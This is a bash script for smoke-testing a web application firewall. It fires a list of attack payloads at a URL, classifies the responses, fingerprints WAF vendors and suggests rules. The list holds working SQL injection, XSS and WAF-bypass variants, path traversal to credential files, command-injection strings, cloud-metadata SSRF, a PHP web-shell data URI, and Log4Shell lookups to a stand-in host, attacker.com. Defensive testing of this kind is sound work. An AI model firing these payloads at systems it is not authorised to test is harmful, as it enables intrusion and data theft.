#!/bin/bash

# Enhanced WAF Tester Script with WAF Fingerprinting
# Usage: ./waf-smoke-test.sh <URL> [-o output.md] [-H "Header: Value"]
# Examples:
#   Default testing: 
#     ./waf-smoke-test.sh "https://example.com"
#   Custom placeholder:
#     ./waf-smoke-test.sh "https://example.com/search?search=FUZZ"
#   With custom headers and output file:
#     ./waf-smoke-test.sh "https://example.com" -o results.md -H "User-Agent: Custom"

# Check dependencies
for cmd in curl awk sed grep; do
  if ! command -v "$cmd" &>/dev/null; then
    echo "Error: $cmd is required but not installed."
    exit 1
  fi
done

# URL encode function (no Python dependency)
urlencode() {
  local string="$1"
  local strlen=${#string}
  local encoded=""
  local pos c o
  
  for ((pos=0; pos<strlen; pos++)); do
    c=${string:$pos:1}
    case "$c" in
      [-_.~a-zA-Z0-9]) # Keep these characters unchanged
        o="$c" ;;
      *) # Encode everything else
        printf -v o '%%%02x' "'$c"
        ;;
    esac
    encoded+="$o"
  done
  echo "$encoded"
}

# Calculate percentage function
calc_percentage() {
    local numerator=$1
    local denominator=$2
    local decimals=${3:-1}
    
    if (( denominator == 0 )); then
        echo "0.0"
        return
    fi
    
    awk -v num="$numerator" -v den="$denominator" -v dec="$decimals" 'BEGIN {printf "%.*f", dec, (num/den)*100}'
}

# Check URL parameter
if [ $# -lt 1 ]; then
  echo "Error: URL parameter is required"
  echo "Usage: $0 <URL> [-o output.md] [-H \"Header: Value\"]"
  exit 1
fi

# Initialize variables
URL="$1"
OUTPUT_FILE=""
HEADERS=()

# Parse remaining arguments
shift
while [ $# -gt 0 ]; do
  case "$1" in
    -o)
      if [ $# -lt 2 ]; then
        echo "Error: -o requires an argument"
        exit 1
      fi
      OUTPUT_FILE="$2"
      shift 2
      ;;
    -H)
      if [ $# -lt 2 ]; then
        echo "Error: -H requires an argument"
        exit 1
      fi
      HEADERS+=("-H" "$2")
      shift 2
      ;;
    *)
      echo "Unknown option: $1"
      exit 1
      ;;
  esac
done

# Attack payloads across multiple categories - using escaped versions for commands
PAYLOADS=(
    # SQL Injection - Basic
    "' OR '1'='1"
    "1; DROP TABLE waftest --"
    "admin' --"
    "' UNION SELECT NULL--"
    "1' AND '1'='1"
    
    # SQL Injection - Obfuscated/Bypass Techniques
    "' oR '1'='1"
    "%27%20oR%20%271%27=%271"
    "'/**/OR/**/'1'/**/=/**/'1"
    "SeLeCt * FrOm users"
    "UN/**/ION SE/**/LECT NULL--"
    "' uni%6Fn select null--"
    
    # XSS - Basic
    "<script>alert('xss')</script>"
    "<img src=x onerror=alert('xss')>"
    "<iframe src=\"javascript:alert('XSS')\"></iframe>"
    "<svg onload=alert('xss')>"
    "javascript:alert('XSS')"
    "<body onload=alert('xss')>"
    
    # XSS - Obfuscated/Bypass Techniques
    "<ScRiPt>alert(1)</ScRiPt>"
    "<scr<script>ipt>alert(1)</script>"
    "<img src=x onerror=eval('\\x61\\x6c\\x65\\x72\\x74(1)')>"
    "<svg/onload=alert(1)>"
    
    # Path Traversal - Basic
    "../../etc/passwd"
    "../../../../../../../etc/passwd"
    "....//....//....//etc/passwd"
    "..\\..\\..\\windows\\system32\\config\\sam"
    
    # Path Traversal - Encoded
    "..%2F..%2Fetc/passwd"
    "..%252F..%252Fetc/passwd"
    "..%c0%af..%c0%afetc/passwd"
    
    # Command Injection - ESCAPED to prevent shell execution
    "\$(cat /etc/passwd)"
    "| cat /etc/passwd"
    "; ls -la"
    "\`whoami\`"
    
    # SSRF
    "http://169.254.169.254/latest/meta-data/"
    "file:///etc/passwd"
    "http://localhost/admin"
    "http://127.0.0.1:22"
    
    # NoSQL Injection
    "{'\\$gt':''}"
    "{\"\\$where\": \"this.password == this.passwordConfirm\"}"
    "{'\\$ne': null}"
    
    # Local File Inclusion
    "php://filter/convert.base64-encode/resource=index.php"
    "php://input"
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4="
    
    # XXE (XML External Entity)
    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"
    
    # LDAP Injection
    "*)(uid=*"
    "admin)(&(password=*"
    
    # Template Injection
    "{{7*7}}"
    "\${7*7}"
    "<%= 7*7 %>"
    
    # Log4Shell
    "\${jndi:ldap://attacker.com/a}"
    "\${jndi:dns://attacker.com}"
    
    # Header Injection
    "test\r\nX-Injected: header"
    
    # Open Redirect
    "//evil.com"
    "https://evil.com"
    
    # 403 Bypass Techniques
    "/admin/."
    "/admin;"
    "//admin//"
)

# Categories for each payload (prevents shell execution issues)
CATEGORIES=(
    "SQL Injection"
    "SQL Injection"
    "SQL Injection"
    "SQL Injection"
    "SQL Injection"
    
    "SQL Injection - Obfuscated"
    "SQL Injection - Obfuscated"
    "SQL Injection - Obfuscated"
    "SQL Injection - Obfuscated"
    "SQL Injection - Obfuscated"
    "SQL Injection - Obfuscated"
    
    "XSS"
    "XSS"
    "XSS"
    "XSS"
    "XSS"
    "XSS"
    
    "XSS - Obfuscated"
    "XSS - Obfuscated"
    "XSS - Obfuscated"
    "XSS - Obfuscated"
    
    "Path Traversal"
    "Path Traversal"
    "Path Traversal"
    "Path Traversal"
    
    "Path Traversal - Encoded"
    "Path Traversal - Encoded"
    "Path Traversal - Encoded"
    
    "Command Injection"
    "Command Injection"
    "Command Injection"
    "Command Injection"
    
    "SSRF"
    "SSRF"
    "SSRF"
    "SSRF"
    
    "NoSQL Injection"
    "NoSQL Injection"
    "NoSQL Injection"
    
    "LFI"
    "LFI"
    "LFI"
    
    "XXE"
    
    "LDAP Injection"
    "LDAP Injection"
    
    "Template Injection"
    "Template Injection"
    "Template Injection"
    
    "Log4Shell"
    "Log4Shell"
    
    "Header Injection"
    
    "Open Redirect"
    "Open Redirect"
    
    "403 Bypass"
    "403 Bypass"
    "403 Bypass"
)

# WAF Block Detection: List of phrases that indicate a block page
WAF_BLOCK_PHRASES=(
    "request has been denied"
    "web application firewall"
    "security policy violation"
    "investigate the incident"
    "contact your system administrator"
    "Web Application Protection"
    "Access Denied"
    "Request Denied"
    "Forbidden"
    "Not Allowed"
    "This request has been blocked"
    "Cloudflare Ray ID"
    "AWS WAF"
    "You don't have permission"
)

# Generic Error/Not Found phrases that indicate payload failed (not necessarily WAF blocked)
PAYLOAD_FAILED_PHRASES=(
    "page not found"
    "404 not found"
    "can't be found"
    "cannot be found"
    "page does not exist"
    "page doesn't exist"
    "not found on this server"
    "the requested URL was not found"
    "file not found"
    "resource not found"
    "could not be found"
    "no such page"
    "invalid page"
    "this page is not available"
    "error 404"
    "HTTP 404"
    "nothing found"
    "page is missing"
)

# WAF Company Names to search for in response body
WAF_NAMES=(
    "Cloudflare"
    "AWS WAF"
    "Akamai"
    "Imperva"
    "Incapsula"
    "Barracuda"
    "F5"
    "BigIP"
    "ModSecurity"
    "Sucuri"
    "FortiWeb"
    "NSFOCUS"
    "Reblaze"
    "StackPath"
    "DDoS-Guard"
    "NAXSI"
    "Signal Sciences"
    "Azure"
    "OPNsense"
    "pfSense"
    "Fortinet"
    "Palo Alto"
    "Radware"
    "AppTrana"
    "Wallarm"
    "Fastly"
    "Wordfence"
    "Qualys"
    "Edgecast"
    "Nginx"
    "Varnish"
    "Citrix"
    "NetScaler"
    "SonicWall"
    "Check Point"
    "Juniper"
    "Arbor"
    "Neustar"
    "PerimeterX"
    "DataDome"
    "Reblaze"
    "Zenedge"
    "Distil"
    "ShieldSquare"
    "Kasada"
    "Netacea"
    "Cequence"
    "Malcare"
    "BulletProof Security"
    "Deflect"
    "Google Cloud Armor"
    "Huawei Cloud WAF"
    "Tencent Cloud WAF"
    "Alibaba Cloud WAF"
)

# Colors
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Insert FUZZ placeholder if missing
if [[ ! "$URL" =~ FUZZ ]]; then
  if [[ "$URL" =~ \? ]]; then
    URL="${URL}&q=FUZZ"
  else
    URL="${URL}?q=FUZZ"
  fi
fi

printf "\n🔗 ${BLUE}Learn More:${NC} ${YELLOW}https://medium.com/@kochuraa/testing-your-firewall-in-60-seconds-a-lightweight-waf-testing-script-that-anyone-can-use-a7a725fefcb7${NC}\n"

printf "\n🔥 ${BLUE}WAF Smoke Test${NC}: ${YELLOW}%s${NC}\n" "$URL"
if [ ${#HEADERS[@]} -gt 0 ]; then
  printf "Headers: ${YELLOW}"
  for ((i=0; i<${#HEADERS[@]}; i+=2)); do
    printf "%s " "${HEADERS[i+1]}"
  done
  printf "${NC}\n"
fi
printf "\n%-3s %-40s %-12s %-10s %-20s\n" "#" "Payload" "Status" "HTTP Code" "Category"
printf "%s\n" "$(printf '%0.s-' $(seq 1 90))"

# Store results
results=()
i=1

# Initialize vulnerability flags
declare -A category_flag
category_flag=(
  ["SQL Injection"]=0
  ["SQL Injection - Obfuscated"]=0
  ["XSS"]=0
  ["XSS - Obfuscated"]=0
  ["Path Traversal"]=0
  ["Path Traversal - Encoded"]=0
  ["Command Injection"]=0
  ["SSRF"]=0
  ["NoSQL Injection"]=0
  ["LFI"]=0
  ["XXE"]=0
  ["LDAP Injection"]=0
  ["Template Injection"]=0
  ["Log4Shell"]=0
  ["Header Injection"]=0
  ["Open Redirect"]=0
  ["403 Bypass"]=0
)

# Track detected WAFs globally across all requests
detected_wafs=()

# Using numeric indexing to avoid shell execution issues
for ((idx=0; idx<${#PAYLOADS[@]}; idx++)); do
    PAYLOAD="${PAYLOADS[$idx]}"
    CATEGORY="${CATEGORIES[$idx]}"
    
    # For display purposes - unescape $ for command injection payloads
    DISPLAY_PAYLOAD="${PAYLOAD//\\\$/\$}"
    DISPLAY_PAYLOAD="${DISPLAY_PAYLOAD//\\\"/\"}"
    
    # Encode and test the payload - use the original (escaped) payload for testing
    ENCODED_PAYLOAD=$(urlencode "$PAYLOAD")
    TARGET_URL=${URL//FUZZ/$ENCODED_PAYLOAD}

    # Perform request and capture both headers and body
    RAW_RESPONSE=$(curl -s -D - ${HEADERS[@]} --max-time 10 --connect-timeout 5 "$TARGET_URL")
    RESPONSE_HEADERS=$(echo "$RAW_RESPONSE" | sed '/^\r$/q')
    RESPONSE_BODY=$(echo "$RAW_RESPONSE" | sed '1,/^\r$/d')
    RESPONSE_CODE=$(echo "$RESPONSE_HEADERS" | grep -oE "[0-9]{3}" | head -1)

    BLOCK_REASON=""
    BLOCKED=0
    BLOCK_PHRASE_MATCHED=0
    PAYLOAD_FAILED=0

    # 1) Check for redirects
    if echo "$RESPONSE_HEADERS" | grep -qi "Location:"; then
        BLOCKED=1
        BLOCK_REASON="Redirect"
    fi

    # 2) Check for HTTP block (403/406)
    if [[ "$RESPONSE_CODE" = "403" || "$RESPONSE_CODE" = "406" ]]; then
        BLOCKED=1
        BLOCK_REASON="HTTP Block"
    fi

    # 3) Check body for WAF block phrases
    for phrase in "${WAF_BLOCK_PHRASES[@]}"; do
        if echo "$RESPONSE_BODY" | grep -qi "$phrase"; then
            BLOCKED=1
            BLOCK_REASON="Body Match"
            BLOCK_PHRASE_MATCHED=1
            break
        fi
    done

    # 4) If a block phrase was found, check for WAF company names in the body
    if [ $BLOCK_PHRASE_MATCHED -eq 1 ]; then
        for waf_name in "${WAF_NAMES[@]}"; do
            if echo "$RESPONSE_BODY" | grep -qi "$waf_name"; then
                # Store globally if new
                if [[ ! " ${detected_wafs[*]} " =~ " $waf_name " ]]; then
                    detected_wafs+=("$waf_name")
                fi
            fi
        done
    fi

    # 5) Check for generic error/not found phrases (payload failed, not necessarily blocked by WAF)
    # Check the ENTIRE response (headers + body) because <title> tags often contain "404 Not Found"
    if [ $BLOCKED -eq 0 ]; then
        FULL_RESPONSE="$RESPONSE_HEADERS $RESPONSE_BODY"
        for phrase in "${PAYLOAD_FAILED_PHRASES[@]}"; do
            if echo "$FULL_RESPONSE" | grep -qi "$phrase"; then
                PAYLOAD_FAILED=1
                break
            fi
        done
    fi

    # Determine final status
    if (( BLOCKED == 1 )); then
        STATUS="${GREEN}Blocked${NC}"
        STATUS_TEXT="Blocked"
    elif (( PAYLOAD_FAILED == 1 )); then
        STATUS="${BLUE}Failed${NC}"
        STATUS_TEXT="Failed"
    elif [[ "$RESPONSE_CODE" =~ ^(2|3) ]]; then
        STATUS="${RED}Allowed${NC}"
        STATUS_TEXT="Allowed"
        category_flag[$CATEGORY]=1
    elif [[ "$RESPONSE_CODE" =~ ^5 ]]; then
        STATUS="${YELLOW}Error${NC}"
        STATUS_TEXT="Error"
    else
        STATUS="${YELLOW}Check${NC}"
        STATUS_TEXT="Check"
    fi
    
    # Safe display truncation
    if [ ${#DISPLAY_PAYLOAD} -gt 37 ]; then
        DISPLAY_PAYLOAD="${DISPLAY_PAYLOAD:0:37}..."
    fi
    
    printf "%-3s %-40s %-12b %-10s %-20s\n" "$((i))" "$DISPLAY_PAYLOAD" "$STATUS" "$RESPONSE_CODE" "$CATEGORY"
    
    # Store the full untruncated payload for the report
    results+=("$PAYLOAD,$STATUS_TEXT,$RESPONSE_CODE,$CATEGORY")
    ((i++))
done

# ==========================
# SUMMARY & REPORT
# ==========================

BLOCKED=0
ALLOWED=0
FAILED=0
ERROR=0
CHECK=0

for result in "${results[@]}"; do
  IFS=',' read -r _ STATUS _ _ <<< "$result"
  if [ "$STATUS" = "Blocked" ]; then ((BLOCKED++)); fi
  if [ "$STATUS" = "Allowed" ]; then ((ALLOWED++)); fi
  if [ "$STATUS" = "Failed" ]; then ((FAILED++)); fi
  if [ "$STATUS" = "Error" ]; then ((ERROR++)); fi
  if [ "$STATUS" = "Check" ]; then ((CHECK++)); fi
done

TOTAL=${#PAYLOADS[@]}

echo
printf "%s\n" "$(printf '%0.s-' $(seq 1 90))"
printf "\n📊 ${BLUE}Summary${NC}:\n"

# Calculate percentages
BLOCKED_PCT=$(calc_percentage $BLOCKED $TOTAL)
ALLOWED_PCT=$(calc_percentage $ALLOWED $TOTAL)
FAILED_PCT=$(calc_percentage $FAILED $TOTAL)
ERROR_PCT=$(calc_percentage $ERROR $TOTAL)
CHECK_PCT=$(calc_percentage $CHECK $TOTAL)

printf "  ${GREEN}Blocked${NC}: %d/%d (%s%%) - WAF actively blocked the payload\n" "$BLOCKED" "$TOTAL" "$BLOCKED_PCT"
printf "  ${BLUE}Failed${NC}: %d/%d (%s%%) - Payload failed (page not found/error)\n" "$FAILED" "$TOTAL" "$FAILED_PCT"
printf "  ${RED}Allowed${NC}: %d/%d (%s%%) - Payload was processed (potential vulnerability)\n" "$ALLOWED" "$TOTAL" "$ALLOWED_PCT"
if [ $ERROR -gt 0 ]; then
  printf "  ${YELLOW}Error${NC}: %d/%d (%s%%) - Server error (5xx)\n" "$ERROR" "$TOTAL" "$ERROR_PCT"
fi
if [ $CHECK -gt 0 ]; then
  printf "  ${YELLOW}Check${NC}: %d/%d (%s%%) - Manual review needed\n" "$CHECK" "$TOTAL" "$CHECK_PCT"
fi

# Security score (Blocked + Failed = Good, because both mean attack didn't work)
SAFE_COUNT=$((BLOCKED + FAILED))
SCORE=$(calc_percentage $SAFE_COUNT $TOTAL 0)
printf "\n🔒 ${BLUE}WAF Security Score${NC}: ${YELLOW}%d%%${NC}\n" "$SCORE"
printf "   (Based on Blocked + Failed payloads)\n"

# Protection rating
if [ "$SCORE" -ge 90 ]; then
    RATING="${GREEN}Excellent${NC}"
elif [ "$SCORE" -ge 70 ]; then
    RATING="${GREEN}Good${NC}"
elif [ "$SCORE" -ge 50 ]; then
    RATING="${YELLOW}Fair${NC}"
else
    RATING="${RED}Poor${NC}"
fi
printf "🛡️ ${BLUE}Protection Rating${NC}: %b\n" "$RATING"

# ==========================
# WAF FINGERPRINTING RESULTS
# ==========================

echo -e "\n🛡️ ${BLUE}WAF Fingerprint(s) Detected${NC}:"

if [ ${#detected_wafs[@]} -eq 0 ]; then
    echo "  • No WAF signatures identified"
else
    for waf in "${detected_wafs[@]}"; do
        printf "  • ${YELLOW}%s${NC}\n" "$waf"
    done
fi

# ==========================
# RECOMMENDATIONS
# ==========================

# Check if there are any recommendations to show
has_recommendations=0
for cat in "${!category_flag[@]}"; do
  if [ ${category_flag[$cat]} -eq 1 ]; then
    has_recommendations=1
    break
  fi
done

# Only show recommendations section if there are vulnerabilities
if [ $has_recommendations -eq 1 ]; then
  echo -e "\n🔧 ${BLUE}WAF Recommendations${NC}:"

  if [ ${category_flag["SQL Injection"]} -eq 1 ]; then
    echo -e "- ${RED}SQL Injection${NC}:"
    echo -e "  • ${GREEN}AWS WAF${NC}: Enable AWSManagedRulesSQLiRuleSet"
    echo -e "  • ${GREEN}CloudFlare${NC}: Enable OWASP Core Rule Set and SQLi Ruleset"
  fi
  if [ ${category_flag["SQL Injection - Obfuscated"]} -eq 1 ]; then
    echo -e "- ${RED}SQL Injection (Obfuscated Bypass)${NC}:"
    echo -e "  • ${YELLOW}WARNING${NC}: WAF detected basic SQLi but missed obfuscated variants"
    echo -e "  • ${GREEN}AWS WAF${NC}: Review and tighten SQLi rules with normalization"
    echo -e "  • ${GREEN}CloudFlare${NC}: Enable advanced SQL injection detection"
  fi
  if [ ${category_flag["XSS"]} -eq 1 ]; then
    echo -e "- ${RED}XSS${NC}:"
    echo -e "  • ${GREEN}AWS WAF${NC}: Enable AWSManagedRulesXSSRuleSet"
    echo -e "  • ${GREEN}CloudFlare${NC}: Enable Cross-site Scripting Attack Score"
  fi
  if [ ${category_flag["XSS - Obfuscated"]} -eq 1 ]; then
    echo -e "- ${RED}XSS (Obfuscated Bypass)${NC}:"
    echo -e "  • ${YELLOW}WARNING${NC}: WAF detected basic XSS but missed obfuscated variants"
    echo -e "  • ${GREEN}AWS WAF${NC}: Enable comprehensive XSS protection with encoding normalization"
    echo -e "  • ${GREEN}CloudFlare${NC}: Enable advanced XSS filters"
  fi
  if [ ${category_flag["Path Traversal"]} -eq 1 ]; then
    echo -e "- ${RED}Path Traversal${NC}:"
    echo -e "  • ${GREEN}AWS WAF${NC}: Enable AWSManagedRulesKnownBadInputsRuleSet"
    echo -e "  • ${GREEN}CloudFlare${NC}: Enable Directory Traversal Attack Protection"
  fi
  if [ ${category_flag["Path Traversal - Encoded"]} -eq 1 ]; then
    echo -e "- ${RED}Path Traversal (Encoded Bypass)${NC}:"
    echo -e "  • ${YELLOW}WARNING${NC}: WAF missed encoded path traversal attempts"
    echo -e "  • ${GREEN}AWS WAF${NC}: Enable URL decode transformation in rules"
    echo -e "  • ${GREEN}CloudFlare${NC}: Enable multi-level encoding detection"
  fi
  if [ ${category_flag["Command Injection"]} -eq 1 ]; then
    echo -e "- ${RED}Command Injection${NC}:"
    echo -e "  • ${GREEN}AWS WAF${NC}: Enable AWSManagedRulesLinuxRuleSet"
    echo -e "  • ${GREEN}CloudFlare${NC}: Enable Server-Side Code Injection Attack Protection"
  fi
  if [ ${category_flag["SSRF"]} -eq 1 ]; then
    echo -e "- ${RED}SSRF${NC}:"
    echo -e "  • ${GREEN}AWS WAF${NC}: Configure custom SSRF protection rules"
    echo -e "  • ${GREEN}CloudFlare${NC}: Create a rule blocking metadata endpoints"
  fi
  if [ ${category_flag["NoSQL Injection"]} -eq 1 ] || [ ${category_flag["LFI"]} -eq 1 ]; then
    echo -e "- ${RED}Advanced Threats${NC}:"
    echo -e "  • ${GREEN}AWS WAF${NC}: Enable AWSManagedRulesCommonRuleSet"
    echo -e "  • ${GREEN}CloudFlare${NC}: Enable High & Medium Risk Rules"
  fi
  if [ ${category_flag["XXE"]} -eq 1 ]; then
    echo -e "- ${RED}XXE (XML External Entity)${NC}:"
    echo -e "  • ${GREEN}AWS WAF${NC}: Enable AWSManagedRulesKnownBadInputsRuleSet"
    echo -e "  • ${GREEN}CloudFlare${NC}: Enable XML/XXE Attack Protection"
  fi
  if [ ${category_flag["LDAP Injection"]} -eq 1 ]; then
    echo -e "- ${RED}LDAP Injection${NC}:"
    echo -e "  • ${GREEN}AWS WAF${NC}: Create custom rules for LDAP metacharacters"
    echo -e "  • ${GREEN}CloudFlare${NC}: Enable injection attack protection"
  fi
  if [ ${category_flag["Template Injection"]} -eq 1 ]; then
    echo -e "- ${RED}Template Injection${NC}:"
    echo -e "  • ${GREEN}AWS WAF${NC}: Enable AWSManagedRulesKnownBadInputsRuleSet"
    echo -e "  • ${GREEN}CloudFlare${NC}: Enable Server-Side Template Injection rules"
  fi
  if [ ${category_flag["Log4Shell"]} -eq 1 ]; then
    echo -e "- ${RED}Log4Shell${NC}:"
    echo -e "  • ${GREEN}AWS WAF${NC}: Enable AWSManagedRulesLog4jRuleSet"
    echo -e "  • ${GREEN}CloudFlare${NC}: Enable Log4j/Log4Shell protection rules"
  fi
  if [ ${category_flag["Header Injection"]} -eq 1 ]; then
    echo -e "- ${RED}Header Injection${NC}:"
    echo -e "  • ${GREEN}AWS WAF${NC}: Create custom header validation rules"
    echo -e "  • ${GREEN}CloudFlare${NC}: Enable HTTP header anomaly detection"
  fi
  if [ ${category_flag["Open Redirect"]} -eq 1 ]; then
    echo -e "- ${RED}Open Redirect${NC}:"
    echo -e "  • ${GREEN}AWS WAF${NC}: Create custom rules for redirect validation"
    echo -e "  • ${GREEN}CloudFlare${NC}: Enable URL redirect protection"
  fi
  if [ ${category_flag["403 Bypass"]} -eq 1 ]; then
    echo -e "- ${RED}403 Bypass (Access Control)${NC}:"
    echo -e "  • ${YELLOW}CRITICAL${NC}: WAF access controls can be bypassed with path manipulation"
    echo -e "  • ${GREEN}AWS WAF${NC}: Review path normalization and URL rewrite rules"
    echo -e "  • ${GREEN}CloudFlare${NC}: Enable strict path validation and normalization"
  fi
else
  echo -e "\n✅ ${GREEN}No vulnerabilities detected - WAF is performing well!${NC}"
fi

# ==========================
# MARKDOWN REPORT GENERATION
# ==========================

if [ -n "$OUTPUT_FILE" ]; then
  # Create the file
  > "$OUTPUT_FILE"
  
  echo "# WAF Security Test Report" >> "$OUTPUT_FILE"
  echo "Date: $(date)" >> "$OUTPUT_FILE"
  echo "" >> "$OUTPUT_FILE"
  
  echo "## Test Configuration" >> "$OUTPUT_FILE"
  echo "- URL: $URL" >> "$OUTPUT_FILE"
  if [ ${#HEADERS[@]} -gt 0 ]; then
    echo -n "- Headers: " >> "$OUTPUT_FILE"
    for ((i=0; i<${#HEADERS[@]}; i+=2)); do
      echo -n "${HEADERS[i+1]} " >> "$OUTPUT_FILE"
    done
    echo "" >> "$OUTPUT_FILE"
  else
    echo "- Headers: None" >> "$OUTPUT_FILE"
  fi
  echo "" >> "$OUTPUT_FILE"
  
  echo "## Summary" >> "$OUTPUT_FILE"
  echo "- Total Tests: $TOTAL" >> "$OUTPUT_FILE"
  echo "- Blocked: $BLOCKED (${BLOCKED_PCT}%)" >> "$OUTPUT_FILE"
  echo "- Failed: $FAILED (${FAILED_PCT}%)" >> "$OUTPUT_FILE"
  echo "- Allowed: $ALLOWED (${ALLOWED_PCT}%)" >> "$OUTPUT_FILE"
  if [ $ERROR -gt 0 ]; then echo "- Error: $ERROR (${ERROR_PCT}%)" >> "$OUTPUT_FILE"; fi
  if [ $CHECK -gt 0 ]; then echo "- Check: $CHECK (${CHECK_PCT}%)" >> "$OUTPUT_FILE"; fi
  echo "- Security Score: $SCORE% (Blocked + Failed)" >> "$OUTPUT_FILE"
  echo "" >> "$OUTPUT_FILE"
  
  echo "## WAF Fingerprint(s) Detected" >> "$OUTPUT_FILE"
  if [ ${#detected_wafs[@]} -eq 0 ]; then
    echo "- No WAF signatures identified" >> "$OUTPUT_FILE"
  else
    for waf in "${detected_wafs[@]}"; do
        echo "- $waf" >> "$OUTPUT_FILE"
    done
  fi
  echo "" >> "$OUTPUT_FILE"
  
  echo "## Results by Category" >> "$OUTPUT_FILE"
  echo "" >> "$OUTPUT_FILE"
  
  categories=("SQL Injection" "SQL Injection - Obfuscated" "XSS" "XSS - Obfuscated" "Path Traversal" "Path Traversal - Encoded" "Command Injection" "SSRF" "NoSQL Injection" "LFI" "XXE" "LDAP Injection" "Template Injection" "Log4Shell" "Header Injection" "Open Redirect" "403 Bypass")
  
  for cat in "${categories[@]}"; do
    cat_exists=0
    for result in "${results[@]}"; do
      if [[ "$result" == *",$cat" ]]; then
        cat_exists=1
        break
      fi
    done
    
    if [ $cat_exists -eq 1 ]; then
      echo "### $cat" >> "$OUTPUT_FILE"
      echo "" >> "$OUTPUT_FILE"
      echo "| # | Payload | Status | HTTP Code |" >> "$OUTPUT_FILE"
      echo "|---|---------|--------|-----------|" >> "$OUTPUT_FILE"
      
      cat_idx=1
      for result in "${results[@]}"; do
        IFS=',' read -r PAYLOAD STATUS CODE CATEGORY <<< "$result"
        if [ "$CATEGORY" = "$cat" ]; then
          PAYLOAD="${PAYLOAD//|/\\|}"
          echo "| $cat_idx | $PAYLOAD | $STATUS | $CODE |" >> "$OUTPUT_FILE"
          ((cat_idx++))
        fi
      done
      echo "" >> "$OUTPUT_FILE"
    fi
  done
  
  echo "## WAF Recommendations" >> "$OUTPUT_FILE"
  echo "" >> "$OUTPUT_FILE"
  
  for CAT in "${!category_flag[@]}"; do
    if [ ${category_flag[$CAT]} -eq 1 ]; then
      echo "### $CAT" >> "$OUTPUT_FILE"
      echo "* Review and enable enhanced WAF rules." >> "$OUTPUT_FILE"
      echo "" >> "$OUTPUT_FILE"
    fi
  done
  
  echo -e "\n📄 Report saved to ${YELLOW}$OUTPUT_FILE${NC}"
fi

echo -e "\n📅 Test Date: $(date)"
echo -e "\n🔧 Test completed successfully! 💪"
